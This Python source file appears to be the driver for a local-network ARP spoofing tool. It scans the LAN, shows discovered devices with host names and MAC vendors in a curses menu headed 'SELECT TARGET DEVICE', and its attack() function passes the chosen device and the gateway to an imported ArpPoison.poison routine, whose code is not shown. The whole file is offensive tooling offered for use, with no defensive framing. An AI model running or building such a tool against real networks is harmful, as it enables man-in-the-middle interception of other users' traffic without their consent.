import atexit
import curses
import json
import socket
import subprocess

import scanner
from cmd_line_args import args
from poision import ArpPoison


def format_mac(address: str) -> str:
    return ':'.join(address[i:i+2] for i in range(0, len(address), 2))


def get_arp_table():
    # Execute the arp -a command and capture its output
    output = subprocess.check_output(["arp", "-a"]).decode()

    # Split the output into lines and remove the header and footer
    lines = output.splitlines()[1:-1]

    # Parse each line to extract the IP address and MAC address
    arp_table = []
    for line in lines:
        parts = line.split()
        ip_address = parts[1][1:-1]  # remove the parentheses
        mac_address = parts[3]
        arp_table.append((ip_address, mac_address))

    return arp_table


def get_vendor(mac) -> str:
    mac = format_mac(mac)[:8]
    with open("mac-vendor.json", "r", encoding="utf-8") as file:
        vendors = json.load(file)
    for vendor in vendors["VendorMapping"]:
        if vendor["_mac_prefix"] == mac:
            return vendor["_vendor_name"]
    return "Unknown Vendor"


def get_host(addr) -> str:
    try:
        hosts = socket.gethostbyaddr(addr)
        return hosts[0]
    except socket.herror:
        return "Unknown"


def selection_menu(devices):
    # Set up the curses screen
    stdscr = curses.initscr()

    def cleanup():
        curses.curs_set(1)
        curses.nocbreak()
        stdscr.keypad(False)
        curses.echo()
        curses.endwin()
    atexit.register(cleanup)
    curses.noecho()
    curses.cbreak()
    curses.curs_set(0)
    stdscr.keypad(True)
    curses.start_color()
    curses.init_pair(1, curses.COLOR_BLACK, curses.COLOR_WHITE)

    # Initialize the current selection to the first device
    current_selection = 0

    # Define the function that will print the menu
    def print_menu(stdscr, current_selection):
        stdscr.clear()
        height, width = stdscr.getmaxyx()
        title = "SELECT TARGET DEVICE"
        stdscr.addstr(0, int((width - len(title)) / 2), title, curses.A_BOLD)
        for idx, device in enumerate(devices):
            host = get_host(device[1])
            vendor = get_vendor(device[0])
            device_str = f"Host: {host} {device[0]} ({device[1]}) Vendor: {vendor}"
            x = width // 2 - len(device_str) // 2
            y = height // 2 - len(devices) // 2 + idx
            if idx == current_selection:
                stdscr.attron(curses.color_pair(1))
                stdscr.addstr(y, x, device_str)
                stdscr.attroff(curses.color_pair(1))
            else:
                stdscr.addstr(y, x, device_str)
        stdscr.refresh()

    # Print the initial menu
    print_menu(stdscr, current_selection)

    # Loop until the user presses Enter
    while True:
        key = stdscr.getch()
        if key == curses.KEY_UP and current_selection > 0:
            current_selection -= 1
        elif key == curses.KEY_DOWN and current_selection < len(devices) - 1:
            current_selection += 1
        elif key == curses.KEY_ENTER or key in [10, 13]:
            break
        print_menu(stdscr, current_selection)

    # Clean up the curses screen
    curses.curs_set(1)
    curses.nocbreak()
    stdscr.keypad(False)
    curses.echo()
    curses.endwin()

    # Return the selected device
    return devices[current_selection]


def attack() -> None:
    s = scanner.NetworkScanner(
        verbosity=args.verbosity, interface=args.interface)
    s.scan()
    local_mac, gateway_ip, gateway_mac, devices = s.get_hw_addresses()

    selected_device = selection_menu(devices)

    print("\n[*]Selected device:", selected_device)

    ArpPoison.poison(
        local_mac, selected_device[1], selected_device[0], gateway_ip, gateway_mac)
